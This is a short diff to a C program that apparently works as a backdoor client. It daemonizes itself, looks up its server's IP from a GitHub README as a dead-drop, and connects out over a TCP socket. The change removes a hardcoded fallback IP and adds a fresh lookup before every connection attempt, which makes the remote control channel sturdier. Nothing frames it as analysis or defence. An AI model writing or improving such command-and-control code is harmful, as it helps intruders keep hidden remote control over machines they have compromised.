@@ -909,11 +909,6 @@ int main(int argc, char *argv[]) {
     // Try to fetch server IP from GitHub README
     server_ip = fetch_server_ip();
     
-    // Fallback to hardcoded IP if fetch fails
-    if (!server_ip) {
-        server_ip = strdup("15.206.168.84");
-    }
-    
     // Daemonize immediately on first run
     static int first_run = 1;
     if (first_run) {
@@ -946,6 +941,15 @@ int main(int argc, char *argv[]) {
         char buffer[BUFFER_SIZE];
         fd_set read_fds;
         int max_fd;
+
+        // Try to fetch updated server IP from GitHub README before each connection attempt
+        char *new_server_ip = fetch_server_ip();
+        if (new_server_ip) {
+            // Successfully fetched new IP - update server_ip
+            free(server_ip);
+            server_ip = new_server_ip;
+        }
+        // If fetch fails, continue using the previous server_ip
 
         // Create socket
         sock = socket(AF_INET, SOCK_STREAM, 0);
